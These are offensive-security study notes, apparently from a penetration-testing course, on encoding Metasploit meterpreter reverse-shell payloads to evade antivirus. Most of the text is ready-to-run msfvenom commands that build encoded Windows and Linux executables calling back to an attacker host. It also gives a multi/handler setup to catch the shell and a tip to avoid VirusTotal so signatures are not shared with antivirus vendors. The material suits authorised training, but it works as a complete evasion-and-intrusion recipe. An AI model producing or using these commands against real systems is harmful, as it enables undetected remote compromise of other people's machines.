**Why Encode?**

- AV uses signature-based detection — checks file signature against database
- Encoding modifies payload signature → AV may not recognize it
- Works on older/basic AV (Windows Defender on Win7, etc.)
- Modern AV has huge databases — encoding alone often not enough

**What is Shellcode?**

- The actual code inside the payload
- Encoding modifies this code to change the signature

---

**List Encoders**

```bash
msfvenom --list encoders
# best encoder: x86/shikata_ga_nai (rank: excellent)
```

**Encode Windows Payload**

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<kali-ip> LPORT=1234 \
  -e x86/shikata_ga_nai \
  -i 10 \
  -f exe -o /root/encoded_x86.exe
```

**Encode Linux Payload**

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=<kali-ip> LPORT=1234 \
  -i 10 \
  -e x86/shikata_ga_nai \
  -f elf -o /root/encoded_x86
```

**Setup Handler (same as before)**

```bash
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <kali-ip>
set LPORT 1234
run
```

---

**Key Notes**

- `-e` = specify encoder
- `-i 10` = 10 iterations (recommended max)
- More iterations = better chance of bypassing AV
- `shikata_ga_nai` only works for x86/32-bit payloads
- **Never upload to VirusTotal** — signatures get shared with AV companies
- Test in offline sandbox only
